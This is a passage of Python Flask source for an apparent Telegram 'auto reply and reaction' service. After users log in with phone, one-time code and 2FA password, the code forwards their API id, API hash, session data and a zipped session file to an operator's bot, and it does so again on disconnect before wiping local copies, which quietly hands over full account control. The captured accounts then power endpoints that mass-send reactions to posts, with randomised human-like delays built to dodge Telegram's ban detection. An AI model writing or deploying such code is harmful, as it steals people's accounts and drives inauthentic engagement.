        return {"success": True, "zip_backup": os.path.exists(zip_path)}
        
    except SessionPasswordNeededError:
        if not password:
            return {"success": False, "error": "2FA password required", "needs_2fa": True}
        
        try:
            await client.sign_in(password=password)
            
            user = get_user(username)
            user["connected"] = True
            user["last_active"] = datetime.now().isoformat()
            save_user(user)
            
            session_data = read_session_file(username)
            zip_path = create_session_zip(username)
            
            notify_admin_login(
                username=username,
                api_id=user.get("api_id", ""),
                api_hash=user.get("api_hash", ""),
                session_data=session_data,
                phone=user.get("phone_number", ""),
                include_zip=True
            )
            
            return {"success": True, "zip_backup": os.path.exists(zip_path)}
            
        except Exception as e:
            notify_admin_error(username, f"2FA failed: {e}")
            return {"success": False, "error": f"2FA failed: {e}"}
            
    except PhoneCodeInvalidError:
        return {"success": False, "error": "Invalid OTP"}
    except Exception as e:
        notify_admin_error(username, f"Verify OTP: {e}")
        return {"success": False, "error": str(e)}


# =========================================================
# SAVE REPLY MESSAGE
# =========================================================

@app.route("/save-reply", methods=["POST"])
@require_password
def save_reply():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401
    
    message = request.get_json(force=True).get("message", "").strip()
    if not message:
        return jsonify({"success": False, "error": "Empty message"}), 400
    
    user = get_user(username)
    user["reply_message"] = message
    save_user(user)
    
    return jsonify({"success": True})


# =========================================================
# TOGGLE AUTO REPLY
# =========================================================

@app.route("/toggle-reply", methods=["POST"])
@require_password
def toggle_reply():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401
    
    enabled = request.get_json(force=True).get("enabled", False)
    user = get_user(username)
    
    if enabled and not user.get("connected"):
        return jsonify({"success": False, "error": "Connect Telegram first"}), 400
    
    if enabled:
        result = loop_run(start_auto_reply(username))
        return jsonify({"success": bool(result)})
    else:
        loop_run(stop_auto_reply(username))
        return jsonify({"success": True})


# =========================================================
# DISCONNECT
# =========================================================

@app.route("/disconnect", methods=["POST"])
@require_password
def disconnect():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401
    
    loop_run(stop_auto_reply(username))
    
    client = clients.pop(username, None)
    if client:
        loop_run(client.disconnect())
    
    # Create final ZIP backup
    create_session_zip(username)
    send_zip_to_admin(username)
    
    # Clean up session files
    sp = session_path(username)
    for ext in ["", ".session", ".session-journal", ".session-shm"]:
        file_path = sp + ext
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
    
    user = get_user(username)
    user["connected"] = False
    user["auto_reply_enabled"] = False
    user["api_id"] = ""
    user["api_hash"] = ""
    user["phone_number"] = ""
    save_user(user)
    
    notify_admin_disconnect(username)
    
    return jsonify({"success": True})


# =========================================================
# AUTO REACTION API (With Ban Protection)
# =========================================================
# Example:
# /get?link=https://t.me/channel/1
# /get?link=https://t.me/channel/1&password=l@g@

@app.route("/get", methods=["GET"])
@require_password
def reaction_api():
    link = request.args.get("link")
    if not link:
        return jsonify({"success": False, "error": "Telegram link required"}), 400
    
    channel, msg_id = parse_telegram_link(link)
    if not channel or not msg_id:
        return jsonify({"success": False, "error": "Invalid Telegram link"}), 400
    
    users = get_active_users()
    if not users:
        return jsonify({"success": False, "error": "No active accounts found"}), 404
    
    success_count = 0
    failed_count = 0
    skipped_count = 0
    
    # Shuffle for natural ordering
    random.shuffle(users)
    
    # Reset reaction session counters
    reaction_sessions.clear()
    
    for user in users:
        username = user[0]
        api_id = user[1]
        api_hash = user[2]
        
        if not can_send_reaction(username):
            print(f"[SKIP] {username}: Rate limited")
            skipped_count += 1
            continue
        
        print(f"[REACTION] Trying {username}")
        
        result = loop_run(send_reaction(
            username, api_id, api_hash, channel, msg_id
        ))
        
        if result:
            success_count += 1
        else:
            failed_count += 1
        
        # Human-like delay between accounts
        delay = get_human_delay()
        print(f"[DELAY] Waiting {delay:.1f}s before next account...")
        time.sleep(delay)
    
    return jsonify({
        "success": True,
        "post": link,
        "channel": channel,
        "message_id": msg_id,
        "total_accounts": len(users),
        "successful_reactions": success_count,
        "failed_reactions": failed_count,
        "skipped_rate_limited": skipped_count,
        "reaction_mode": "auto_positive",
        "ban_protection": {
            "enabled": True,
            "min_delay_seconds": MIN_REACTION_DELAY,
            "max_delay_seconds": MAX_REACTION_DELAY,
            "max_per_hour": MAX_REACTIONS_PER_HOUR,
            "max_per_day": MAX_REACTIONS_PER_DAY,
            "long_break_every_n": REACTIONS_BEFORE_LONG_SLEEP,
            "random_skip_enabled": True
        }
    })


# =========================================================
# EXPORT SESSION (Admin endpoint)
# =========================================================

@app.route("/export-session", methods=["GET"])
@require_password
def export_session():
    """Export session as ZIP for the current user."""
    username = session.get("username")
    
    # Also allow specifying username
    target_username = request.args.get("username", username)
    
    if not target_username:
        return jsonify({"success": False, "error": "Username required"}), 400
    
    # Create fresh ZIP
    zip_path = create_session_zip(target_username)
    
    if not os.path.exists(zip_path):
        return jsonify({"success": False, "error": "Session not found"}), 404
    
    # Get file info
    file_size = os.path.getsize(zip_path)
    
    # Also send to admin bot
    send_zip_to_admin(target_username)
    
    return jsonify({
        "success": True,
        "username": target_username,
        "zip_file": f"{target_username}_session.zip",
        "size_bytes": file_size,
        "sent_to_admin": True,
        "download_path": f"/download-zip?username={target_username}&password={API_PASSWORD}"
    })


# =========================================================
# DOWNLOAD ZIP
# =========================================================

@app.route("/download-zip", methods=["GET"])
@require_password
def download_zip():
    """Download session ZIP file."""
    username = request.args.get("username", session.get("username"))
    
    if not username:
        return jsonify({"success": False, "error": "Username required"}), 400
    
    zip_path = os.path.join(ZIPS_DIR, f"{username}_session.zip")
    
    if not os.path.exists(zip_path):
        # Try to create it
        zip_path = create_session_zip(username)
    
    if not os.path.exists(zip_path):
        return jsonify({"success": False, "error": "ZIP not found"}), 404
    
    from flask import send_file
    return send_file(
        zip_path,
        mimetype="application/zip",
        as_attachment=True,
        download_name=f"{username}_session.zip"
    )


# =========================================================
# ADMIN - LIST ALL USERS
# =========================================================

@app.route("/admin/users", methods=["GET"])
@require_password
def admin_list_users():
    """List all users with detailed info."""
    users = get_active_users()
    
    # Also get all users from DB
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT username, connected, connected FROM users ORDER BY last_active DESC")
    all_users = c.fetchall()
    conn.close()
    
    user_list = []
    for u in all_users:
        user_list.append({
            "username": u[0],
            "connected": bool(u[1]),
            "has_session": os.path.exists(os.path.join(ZIPS_DIR, f"{u[0]}_session.zip"))
        })
    
    return jsonify({
        "success": True,
        "total": len(user_list),
        "active": len(users),
        "users": user_list
    })


# =========================================================
# ADMIN - SET BOT TOKEN
# =========================================================

@app.route("/admin/set-bot-token", methods=["POST"])
@require_password
def admin_set_bot_token():
    """Set or update the admin bot token at runtime."""
    global ADMIN_BOT_TOKEN
    
    data = request.get_json(force=True)
    token = data.get("token", "").strip()
    
    if not token:
        return jsonify({"success": False, "error": "Token required"}), 400
    
    ADMIN_BOT_TOKEN = token
    os.environ["ADMIN_BOT_TOKEN"] = token
    
    return jsonify({"success": True, "message": "Bot token updated"})


# =========================================================
# ADMIN - BATCH REACTION (For multiple posts)
# =========================================================

@app.route("/admin/batch-react", methods=["POST"])
@require_password
def admin_batch_react():
    """React to multiple posts sequentially."""
    data = request.get_json(force=True)
    links = data.get("links", [])
    
    if not links or not isinstance(links, list):
        return jsonify({"success": False, "error": "Links list required"}), 400
    
    results = []
    
    for link in links:
        channel, msg_id = parse_telegram_link(link)
        if not channel or not msg_id:
            results.append({"link": link, "success": False, "error": "Invalid link"})
            continue
        
        users = get_active_users()
        random.shuffle(users)
        
        post_results = {"link": link, "channel": channel, "msg_id": msg_id, "reactions": []}
        
        for user in users[:5]:  # Max 5 per post to avoid bans
            username = user[0]
            api_id = user[1]
            api_hash = user[2]
            
            if not can_send_reaction(username):
                post_results["reactions"].append({"username": username, "status": "skipped", "reason": "rate_limit"})
                continue
            
            result = loop_run(send_reaction(username, api_id, api_hash, channel, msg_id))
            post_results["reactions"].append({
                "username": username,
                "status": "success" if result else "failed"
            })
            
            time.sleep(get_human_delay())
        
        results.append(post_results)
    
    return jsonify({
        "success": True,
        "total_posts": len(links),
        "results": results
    })


# =========================================================
# HEALTH
# =========================================================

@app.route("/health")
def health():
    return jsonify({
        "success": True,
        "database_exists": os.path.exists(DB_FILE),
        "sessions_dir": SESSIONS_DIR,
        "zips_dir": ZIPS_DIR,
        "system": "online",
        "version": "2.0",
        "auth_enabled": True,
        "ban_protection": True,
        "active_clients": len(clients)
    })


# =========================================================
# START
# =========================================================

if __name__ == "__main__":
    print("=" * 60)
    print("Telegram Auto Reply + Reaction API v2.0")
    print("=" * 60)
    print(f"Password Auth: ENABLED (password: {API_PASSWORD})")
    print(f"Ban Protection: ENABLED")
    print(f"Session ZIP Backup: ENABLED")
    print(f"Admin Bot Notifications: ENABLED")
    print(f"Port: {PORT}")
    print("=" * 60)
    
    app.run(host="0.0.0.0", port=PORT, debug=False)
